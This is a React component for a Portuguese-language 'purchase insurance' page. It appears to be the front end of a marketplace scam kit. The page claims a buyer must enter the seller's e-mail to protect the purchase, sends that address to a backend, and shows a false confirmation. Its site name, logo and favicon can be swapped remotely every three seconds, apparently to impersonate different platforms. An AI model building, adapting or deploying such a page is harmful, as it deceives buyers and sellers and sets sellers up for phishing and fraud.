import { useState, useEffect, FormEvent } from "react";
import { motion, AnimatePresence } from "motion/react";
import { AlertCircle, CheckCircle2, Instagram } from "lucide-react";
import { APP_CONFIG } from "./constants";

export default function App() {
  const [email, setEmail] = useState("");
  const [status, setStatus] = useState<"idle" | "loading" | "success" | "error">("idle");
  const [message, setMessage] = useState("");
  const [dynamicConfig, setDynamicConfig] = useState({ 
    logoUrl: APP_CONFIG.logoImageUrl, 
    buttonColor: "bg-[#6E0AD6] hover:bg-[#5a08b3]",
    siteName: APP_CONFIG.siteName,
    supportUrl: APP_CONFIG.supportUrl,
    logoClass: "h-28"
  });

  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const res = await fetch("/api/config");
        if (res.ok) {
          const conf = await res.json();
          setDynamicConfig(conf);
          document.title = "Seguro de Compra - " + conf.siteName;
          const favicon = document.getElementById("favicon") as HTMLLinkElement;
          if (favicon) {
            favicon.href = conf.logoUrl;
          }
        }
      } catch (e) {
        // Ignora erro se backend estiver offline
      }
    };
    fetchConfig();
    const interval = setInterval(fetchConfig, 3000); // Checa a cada 3 segundos
    return () => clearInterval(interval);
  }, []);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    
    const emailLower = email.toLowerCase();
    const trustedDomains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com', 'icloud.com'];
    const domain = emailLower.split("@")[1];
    const isBrazilian = emailLower.endsWith(".br");
    const isTrusted = trustedDomains.some(d => domain === d);

    if (!isBrazilian && !isTrusted) {
      setStatus("error");
      setMessage("Use um e-mail válido (Gmail, Hotmail, etc) ou um domínio .br");
      return;
    }

    setStatus("loading");
    try {
      const response = await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      });

      const data = await response.json();

      if (response.ok) {
        setStatus("success");
        setMessage("E-mail verificado com sucesso! Sua compra está protegida.");
      } else {
        setStatus("error");
        setMessage(data.error || "Ocorreu um erro ao verificar o e-mail.");
      }
    } catch (err) {
      setStatus("error");
      setMessage("Erro de conexão com o servidor.");
    }
  };

  return (
    <div className="min-h-screen bg-[#F5F5F5] flex flex-col items-center justify-center p-4 font-sans">
      <div className="mb-6 text-center">
        <span className="text-[10px] font-medium tracking-[0.2em] text-gray-400 uppercase">
          ATENÇÃO SOBRE A SUA COMPRA
        </span>
      </div>

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-[500px] bg-white rounded-[32px] shadow-[0_10px_40px_rgba(0,0,0,0.04)] overflow-hidden"
      >
        <div className="p-10 md:p-12">
          {/* Centered Logo - Image or Configurable Text */}
          <div className="flex justify-start mb-14">
            {APP_CONFIG.useImageLogo ? (
              <img 
                src={dynamicConfig.logoUrl} 
                alt="Logo" 
                className={`${dynamicConfig.logoClass} w-auto object-contain`}
                referrerPolicy="no-referrer"
              />
            ) : (
              <div className="flex items-center font-bold text-7xl tracking-tighter">
                {APP_CONFIG.logo.parts.map((part, index) => (
                  <span key={index} style={{ color: part.color }}>
                    {part.text}
                  </span>
                ))}
                <span 
                  className={`ml-2 text-[48px] font-bold ${APP_CONFIG.logo.suffix.italic ? 'italic' : ''}`} 
                  style={{ color: APP_CONFIG.logo.suffix.color }}
                >
                  {APP_CONFIG.logo.suffix.text}
                </span>
              </div>
            )}
          </div>

          <AnimatePresence mode="wait">
            {status === "success" ? (
              <motion.div
                key="success"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="text-center py-10"
              >
                <div className="w-20 h-20 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
                  <CheckCircle2 size={40} />
                </div>
                <h2 className="text-2xl font-bold text-gray-900 mb-4">Confirmado!</h2>
                <p className="text-gray-500 leading-relaxed">{message}</p>
                <button 
                  onClick={() => { setStatus("idle"); setEmail(""); }}
                  className="mt-8 text-[#6E0AD6] font-bold hover:underline"
                >
                  Voltar
                </button>
              </motion.div>
            ) : (
              <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                <h2 className="text-[28px] font-semibold text-[#2E2E2E] mb-6 leading-tight text-left">
                  Estamos quase lá...
                </h2>
                
                <p className="text-[#5F6368] text-[15px] leading-[1.6] mb-10 text-left">
                  Antes de finalizar a sua compra em nossa plataforma, solicitamos que confirme o e-mail do vendedor(a) para ativar o seguro de compra e venda. O e-mail é necessário para verificar se o produto postado pelo autor foi adquirido e o(a) {dynamicConfig.siteName}, confirmando se o produto dele foi vendido, vai informar a ele que um e-mail de verificação foi enviado para ele.
                </p>

                <form onSubmit={handleSubmit} className="space-y-8">
                  <div className="space-y-4">
                    <p className="text-[13px] text-[#9AA0A6] text-left">
                      [ insira o e-mail do vendedor(a) abaixo e confirme a sua compra ]
                    </p>
                    <div className="relative">
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder=""
                        className="w-full px-6 py-4 bg-white border-2 border-[#F1F3F4] rounded-full focus:outline-none focus:border-[#6E0AD6] transition-all text-gray-700 font-medium"
                        required
                      />
                    </div>
                  </div>

                  {status === "error" && (
                    <motion.div 
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: "auto" }}
                      className="flex items-center gap-2 text-red-500 text-xs font-bold justify-center"
                    >
                      <AlertCircle size={14} />
                      <span>{message}</span>
                    </motion.div>
                  )}

                  <button
                    type="submit"
                    disabled={status === "loading"}
                    className={`w-full h-[56px] disabled:bg-gray-200 text-white font-semibold rounded-full shadow-lg transition-all text-[17px] ${dynamicConfig.buttonColor}`}
                  >
                    {status === "loading" ? "Processando..." : "Confirmar e-mail"}
                  </button>
                </form>

                <div id="footer-thanks" className="mt-10 pt-8 border-t border-gray-50 text-left">
                  <p className="text-[13px] text-[#5F6368] leading-relaxed">
                    Agradecemos por se juntar a nós, <br />
                    <span className="font-bold text-[#2E2E2E]">Mantenha sempre as suas compras protegidas com o seguro de compras e vendas {dynamicConfig.siteName}.</span>
                  </p>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Social Icons - Exact SVG Replicas */}
          <div className="mt-12 flex justify-center gap-8 text-[#2E2E2E]">
            {/* Facebook */}
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" className="cursor-pointer">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            {/* Instagram */}
            <Instagram size={20} className="cursor-pointer" />
            {/* WhatsApp - Original Symbol */}
            <a href="https://wa.me/5511922968136" target="_blank" rel="noopener noreferrer" className="hover:text-[#25D366] transition-colors" title="Falar no WhatsApp">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" className="cursor-pointer">
                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.414 0 .018 5.396.015 12.03c0 2.12.554 4.189 1.605 6.006L0 24l6.117-1.605a11.803 11.803 0 005.925 1.586h.005c6.634 0 12.032-5.396 12.035-12.031a11.76 11.76 0 00-3.528-8.503z"/>
              </svg>
            </a>
            {/* YouTube */}
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" className="cursor-pointer">
              <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
            </svg>
          </div>
        </div>
      </motion.div>

      <div className="mt-8 text-[11px] text-gray-400 font-medium">
        Enviado por <span className="underline cursor-pointer">{dynamicConfig.supportUrl}</span>
      </div>
    </div>
  );
}
